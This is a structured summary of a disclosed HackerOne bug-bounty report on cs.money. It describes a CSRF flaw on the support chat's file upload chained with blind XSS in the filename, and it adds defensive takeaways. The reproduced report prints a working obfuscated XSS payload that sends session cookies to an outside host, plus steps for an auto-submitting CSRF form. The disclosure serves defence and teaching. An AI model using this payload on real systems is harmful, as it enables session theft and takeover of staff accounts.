# Blind XSS via CSRF on Image Upload with Cookie Exfiltration

## Metadata
- **Source:** HackerOne
- **Report:** 1010466 | https://hackerone.com/reports/1010466
- **Submitted:** 2020-10-17
- **Reporter:** benjamin-mauss
- **Program:** cs.money
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Insufficient Input Validation, Missing CSRF Protections
- **CVEs:** None
- **Category:** web-api

## Summary
The support.cs.money upload_file endpoint lacks CSRF token validation and proper input sanitization, allowing attackers to upload files with XSS payloads in the filename parameter. A CSRF attack can trigger automatic file uploads without user interaction, and when support staff view the uploaded file in the chat, the blind XSS executes to steal session cookies.

## Attack scenario
1. Attacker crafts a malicious HTML form containing a file with an XSS payload embedded in the filename parameter
2. Attacker sends victim a link to the malicious HTML form via social engineering or phishing
3. When victim visits the form, a CSRF request automatically posts to support.cs.money/upload_file without their knowledge
4. The file with XSS payload in filename is uploaded and stored in the chat system
5. When support staff opens the chat to view the uploaded file, the blind XSS executes in their browser context
6. The injected JavaScript exfiltrates session cookies by encoding attacker's URL and sending cookies via XMLHttpRequest to exfiltration server

## Root cause
The upload_file endpoint fails to implement CSRF token validation, origin/referrer checking, and does not sanitize or escape the filename parameter before storing and rendering it in the chat interface. This allows arbitrary JavaScript execution in the context of users viewing the uploaded file.

## Attacker mindset
An attacker can compromise support staff accounts without their interaction, steal admin session tokens, perform account takeovers, and potentially escalate to lateral movement. The blind XSS nature makes it difficult to detect and the CSRF component means victims don't need to click a link—just visit a webpage.

## Defensive takeaways
- Implement CSRF token validation on all state-changing endpoints including file uploads
- Add Origin and Referer header validation to restrict cross-origin requests
- Implement strict Content Security Policy (CSP) headers to prevent inline script execution
- Sanitize and escape all user-controlled input, especially filenames, before rendering in HTML contexts
- Use allowlists for filename characters and reject suspicious patterns
- Store uploaded files with randomized names, separate from user input
- Implement proper output encoding when displaying filenames in chat interface
- Use httpOnly and Secure flags on session cookies to prevent JavaScript access
- Monitor and log file uploads with suspicious filenames for security review
- Implement automatic scanning of uploaded files for malicious payloads

## Variant hunting
Test other file upload endpoints for similar CSRF and XSS vulnerabilities
Check if other user-controlled fields (title, description, tags) have the same sanitization gaps
Investigate if the vulnerability affects other file types beyond images
Test reflected XSS in filename parameters before upload
Check if the XSS payload persists in file metadata and other storage locations
Test SVG file uploads which may bypass image validation while allowing embedded scripts
Investigate if similar CSRF issues exist on other endpoints handling user input

## MITRE ATT&CK
- T1190
- T1566
- T1192
- T1598
- T1539
- T1185

## Notes
This is a critical chained vulnerability combining CSRF and blind XSS. The use of character encoding (String.fromCharCode) to obfuscate the exfiltration URL shows sophistication in payload construction. The blind XSS aspect makes it particularly dangerous as the attacker doesn't need to verify execution. Support staff are high-value targets as they may have elevated privileges.

## Full report
<details><summary>Expand</summary>

## Summary:
- The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
- The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request. 

## Steps To Reproduce:
XSS
- use a proxy like burp suite and turn intercept on
- upload a file to the support chat
- change the filename to \"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();
- open the chat support and xss will activate

 CSRF
- create a file html in some server
- create a form with a file and the payload name
- send to a new tab. This one will post the image with payload

## Supporting Material/References:
https://onlinestringtools.com/convert-string-to-ascii      to convert the attacker's website link to ascii

## Impact

Allows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.
For the guys of support chat, they don't even need to click in the link for the XSS activate.

</details>

---
*Analysed by Claude on 2026-05-24*
